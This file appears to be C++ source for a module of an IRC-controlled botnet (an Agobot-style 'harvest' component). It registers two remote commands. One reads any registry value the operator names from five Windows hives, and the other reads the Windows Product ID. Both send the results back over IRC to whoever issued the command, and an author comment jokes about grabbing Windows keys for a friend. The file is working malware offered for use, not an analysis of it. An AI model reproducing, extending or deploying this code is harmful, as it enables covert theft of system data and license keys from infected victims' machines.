
#include "main.h"
#include "mainctrl.h"
#include "harvest_registry.h"

void CHarvest_Registry::Init()
{	
	
	REGCMD(m_cmdRegistry,	"harvest.registry",	"makes the bot get registry info from exact registry path",	false,	this); 
    REGCMD(m_cmdWindowsKeys,	"harvest.windowskeys",	"makes the bot get windows registry info",	false,	this);

}

bool CHarvest_Registry::HandleCommand(CMessage *pMsg)
{	
	
	if(!pMsg->sCmd.Compare("harvest.registry"))
	{

#ifdef WIN32

		HKEY hkey=NULL; 
		DWORD dwSize=128; 
		unsigned char szDataBuf[128];

		LONG lRet=RegOpenKeyEx(HKEY_CURRENT_USER, pMsg->sChatString.Token(1, " ", true).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", true).CStr(), NULL, NULL, szDataBuf, &dwSize)==ERROR_SUCCESS)
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found registry Info from HKEY_CURRENT_USER: (%s).", szDataBuf);
		RegCloseKey(hkey);

///////////


		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pMsg->sChatString.Token(1, " ", true).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", true).CStr(), NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found registry Info from HKEY_LOCAL_MACHINE: (%s).", szDataBuf);
		RegCloseKey(hkey);

//////////////


		dwSize = 128; lRet = RegOpenKeyEx(HKEY_CURRENT_CONFIG, pMsg->sChatString.Token(1, " ", true).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", true).CStr(), NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found registry Info from HKEY_CURRENT_CONFIG: (%s).", szDataBuf);
		RegCloseKey(hkey);

/////////////////

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_CLASSES_ROOT, pMsg->sChatString.Token(1, " ", true).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", true).CStr(), NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found registry Info from HKEY_CLASSES_ROOT: (%s).", szDataBuf);
		RegCloseKey(hkey);

/////////////////////

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_USERS, pMsg->sChatString.Token(1, " ", true).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", true).CStr(), NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found registry Info from HKEY_USERS: (%s).", szDataBuf);
		RegCloseKey(hkey);


#endif // WIN32
	}

/* 

  your friend need some windows keys and youo found that you cant get them cause of your setting in config.  
  This is backup ;)  
  Glow 

*/

if(!pMsg->sCmd.Compare("harvest.windowskeys"))
	{

#ifdef WIN32

	    HKEY hkey=NULL; 
		DWORD dwSize=128; 
		unsigned char szDataBuf[128];

			dwSize = 128; LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hkey);
			if(RegQueryValueEx(hkey, "ProductId", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
					"Found Windows Product ID (%s).", szDataBuf);
			RegCloseKey(hkey); 
		
#endif // WIN32
	}

return true; 

}
